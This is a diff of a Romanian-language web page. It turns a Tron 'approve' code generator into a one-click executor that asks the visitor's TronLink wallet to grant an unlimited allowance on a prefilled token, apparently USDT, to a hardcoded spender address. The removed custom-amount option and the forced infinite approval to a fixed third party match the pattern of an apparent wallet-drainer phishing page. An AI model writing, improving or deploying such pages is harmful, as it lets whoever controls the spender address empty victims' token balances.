@@ -2,94 +2,81 @@
 <html lang="ro">
 <head>
   <meta charset="UTF-8">
-  <title>Generator Approve Tron</title>
+  <title>Tron Approve - Executare Directă</title>
   <style>
     body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
-    .container { max-width: 800px; margin: auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
-    input, select { width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; border-radius: 6px; border: 1px solid #ccc; }
-    button { padding: 14px 25px; font-size: 16px; background: #0066ff; color: white; border: none; border-radius: 8px; cursor: pointer; }
+    .container { max-width: 700px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+    input { width: 100%; padding: 12px; margin: 10px 0; font-size: 16px; border: 1px solid #ccc; border-radius: 6px; }
+    button { width: 100%; padding: 18px; font-size: 18px; background: #0066ff; color: white; border: none; border-radius: 8px; cursor: pointer; margin: 15px 0; }
     button:hover { background: #0055dd; }
-    textarea { width: 100%; height: 420px; font-family: monospace; padding: 15px; margin-top: 15px; }
+    #status { padding: 15px; margin-top: 15px; border-radius: 8px; font-size: 16px; }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <h2>🔧 Generator Approve Tron</h2>
+  <h2>🚀 Tron Approve Executor</h2>
+  
+  <label><strong>Token Address:</strong></label>
+  <input type="text" id="token" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">
 
-  <label><strong>1. Token Address:</strong></label>
-  <input type="text" id="token" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" placeholder="Adresa token (ex: USDT)">
+  <label><strong>Spender Address:</strong></label>
+  <input type="text" id="spender" value="TWU2qigx3YDhU5bhHp1RTXYpAT3jYETLLG">
 
-  <label><strong>2. Spender Address:</strong></label>
-  <input type="text" id="spender" value="TWU2qigx3YDhU5bhHp1RTXYpAT3jYETLLG" placeholder="Adresa care primește permisiunea">
+  <button onclick="executeApprove()">🚀 EXECUTĂ APPROVE ACUM</button>
 
-  <label><strong>3. Sumă:</strong></label>
-  <select id="amountType">
-    <option value="max">Max Approve (Nelimitat)</option>
-    <option value="custom">Sumă personalizată</option>
-  </select>
-  <input type="text" id="customAmount" placeholder="Ex: 1000000000" style="display:none;">
-
-  <button onclick="genereazaCod()">🔄 Generează Codul Final</button>
-
-  <h3>Codul final (copiază-l):</h3>
-  <textarea id="codFinal" readonly></textarea>
-
-  <button onclick="copiereCod()">📋 Copiază Codul</button>
+  <div id="status">Aștept...</div>
 </div>
 
 <script>
-function genereazaCod() {
-    const tokenAddress = document.getElementById('token').value.trim();
-    const spender = document.getElementById('spender').value.trim();
-    const amountType = document.getElementById('amountType').value;
-    
-    let amount = '1000000000'; // valoare default
+async function executeApprove() {
+    const status = document.getElementById('status');
+    status.style.background = "#fff3cd";
+    status.textContent = "Se verifică TronLink...";
 
-    if (amountType === "max") {
-        amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    } else {
-        amount = document.getElementById('customAmount').value.trim() || "1000000";
+    // Verificăm dacă TronLink este instalat
+    if (!window.tronWeb) {
+        status.style.background = "#f8d7da";
+        status.textContent = "❌ TronLink nu este instalat sau nu este activ!";
+        return;
     }
 
-    const cod = `// ==================== APPROVE TRON ====================
-// 1. Definim cine primește permisiunea
-const spender = "${spender}";
+    try {
+        const tokenAddress = document.getElementById('token').value.trim();
+        const spender = document.getElementById('spender').value.trim();
 
-// 2. Definim tokenul
-const tokenAddress = "${tokenAddress}";
+        if (!tokenAddress || !spender) {
+            status.textContent = "❌ Completează ambele adrese!";
+            return;
+        }
 
-// 3. Accesăm contractul
-const contract = await window.tronWeb.contract().at(tokenAddress);
+        status.textContent = "🔄 Se pregătește tranzacția... Confirmă în TronLink";
 
-// 4. Suma de aprobat
-const amount = "${amount}";
+        const contract = await window.tronWeb.contract().at(tokenAddress);
 
-// 5. Trimitem tranzacția
-const result = await contract.approve(spender, amount).send();
+        const result = await contract.approve(
+            spender,
+            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" // infinite
+        ).send();
 
-console.log("✅ Approve reușit! TxID:", result);
-// ======================================================`;
+        status.style.background = "#d4edda";
+        status.innerHTML = `✅ <strong>Approve reușit!</strong><br><br>Transaction ID:<br><small>${result}</small>`;
 
-    document.getElementById('codFinal').value = cod;
-}
+        console.log("Tranzacție reușită:", result);
 
-function copiereCod() {
-    const text = document.getElementById('codFinal').value;
-    if (text) {
-        navigator.clipboard.writeText(text);
-        alert("✅ Codul a fost copiat!");
+    } catch (error) {
+        console.error(error);
+        status.style.background = "#f8d7da";
+        status.textContent = `❌ Eroare: ${error.message || error}`;
     }
 }
 
-// Arată câmpul pentru sumă personalizată
-document.getElementById('amountType').addEventListener('change', function() {
-    document.getElementById('customAmount').style.display = 
-        this.value === "custom" ? "block" : "none";
-});
-
-// Generează automat la pornire
-window.onload = genereazaCod;
+// Verificăm automat la încărcare dacă TronLink este disponibil
+window.onload = () => {
+    if (window.tronWeb) {
+        document.getElementById('status').textContent = "✅ TronLink detectat - Poți apăsa butonul";
+    }
+};
 </script>
 
 </body>
